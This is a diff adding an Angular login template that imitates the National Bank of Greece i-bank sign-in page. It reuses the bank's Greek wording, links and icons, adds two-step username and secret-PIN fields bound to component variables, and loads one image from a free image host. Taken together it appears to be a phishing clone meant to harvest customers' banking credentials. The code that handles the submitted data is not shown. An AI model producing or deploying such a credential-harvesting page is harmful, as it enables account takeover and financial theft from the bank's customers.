@@ -1,0 +1,90 @@
+<ngx-spinner></ngx-spinner>
+
+
+<div class="max-width-container-login">
+    <div class="login-container">
+        <h1 class="text-page-heading text-align-center text-medium text-white"> Καλώς ήρθατε στο i-bank</h1><img
+            class="login-header-img margin-bottom-medium login-night">
+        <!---->
+        <div>
+            <div class="user-login-subcontainer">
+                <!---->
+                <div class="full-height flex-column">
+                    <div class="position-relative">
+                        <div class="flex-center">
+                            <input [(ngModel)]="signature" (keyup)="onKey()" class="oval-input ng-pristine ng-valid ng-touched"
+                                test-field="usernameField" type="text" placeholder="Κωδικός χρήστη">
+                            
+                                <!---->
+                            <div class="right-default field-tooltip"><button class="button-transparent" type="button">
+                                <img src="https://i.ibb.co/L5VCZ9j/Finger.png" width="28" height="28" alt="">
+                            </button>
+                            </div>
+                            <br>
+                            
+                            <!---->
+                        </div>
+                        
+                    </div>
+                    <div class="position-relative margin-top-default" [hidden]="hiddenPass" >
+                        <div class="flex-center">
+                            <input [(ngModel)]="pin" (keyup)="onKey2()" class="oval-input ng-pristine ng-valid ng-touched"
+                                test-field="usernameField" type="password" placeholder="Μυστικός κωδικός">
+                            
+                                <!---->
+                          
+                            <br>
+                            
+                            <!---->
+                        </div>
+                        
+                    </div>
+                    <!---->
+                    <!---->
+                    <div class="flex-vertical-center-space-between margin-top-normal">
+                        <!---->
+                        <!----><button class="button" (click)="showInput()" style="min-width: 20rem;" test-button="continueLoginButton"
+                        [disabled]="disabled" [hidden]="hiddenBtn1"> Συνέχεια </button>
+                        <button class="button" (click)="submitForm()" style="min-width: 20rem;" test-button="continueLoginButton"
+                        [disabled]="disabled || disabled2" [hidden]="hiddenBtn2">  Σύνδεση  </button>
+                        <!---->
+                    </div>
+                    <!---->
+                    <!---->
+              </div>
+                <!---->
+            </div>
+        </div>
+        <!---->
+        <div class="flex-vertical-center  margin-horizontal-auto"
+            style="max-width: 18.75rem; height: 100%; margin-top: 1.5rem">
+            <div
+                class="icon-container flex-all-center text-large lock-circle-icon circle-large-primary margin-right-medium">
+                <img src="https://ibank.nbg.gr/identity/dist/icons/lock-circle.8d6ed53141c46ef004136125d2fdd5e8.svg">
+            </div><span class="text-medium text-white text-small"> Οι διαδικτυακές τραπεζικές συναλλαγές είναι ένα ηλεκτρονικό σύστημα πληρωμών που επιτρέπει στους πελάτες της Εθνικής Τράπεζας να πραγματοποιούν οικονομικές συναλλαγές. <a
+                    class="link-white text-white text-bold" href="https://ibank.nbg.gr/identity/security-information"
+                    target="_blank">Συμβουλές
+                    ασφαλείας</a></span>
+        </div>
+    </div>
+    <div class="margin-top-auto">
+        <div class="useful-links-container">
+            <div class="social-links-container"><a class="icon-container icon-facebook-lg" ngclass="icon-facebook-lg"
+                    target="_blank" href="https://www.facebook.com/ibanknbg"></a><a
+                    class="icon-container icon-twitter-lg" ngclass="icon-twitter-lg" target="_blank"
+                    href="https://twitter.com/NationalBankGR"></a><a class="icon-container icon-youtube-lg"
+                    ngclass="icon-youtube-lg" target="_blank"
+                    href="https://www.youtube.com/channel/UCAwPZIUpdP3aIQlfw4bETLQ"></a><a
+                    class="icon-container icon-linkedin-lg" ngclass="icon-linkedin-lg" target="_blank"
+                    href="https://www.linkedin.com/company/national-bank-of-greece/"></a><a
+                    class="icon-container icon-email-lg" ngclass="icon-email-lg"
+                    href="mailto:contact.center@nbg.gr"></a></div>
+            <div class="links-container">
+                <!----><a class="link-white button-transparent useful-link" target="_blank"
+                    href="https://www.nbg.gr/Style%20Library/ReusableContent/privacy_statement.pdf"> Προστασία
+                    Δεδομένων Προσωπικού Χαρακτήρα </a><a class="link-white button-transparent useful-link"
+                    target="_blank" href="https://ibank.nbg.gr/identity/browser-compatibility"> Συμβατότητα με
+                    browsers </a></div>
+        </div>
+    </div>
+</div>
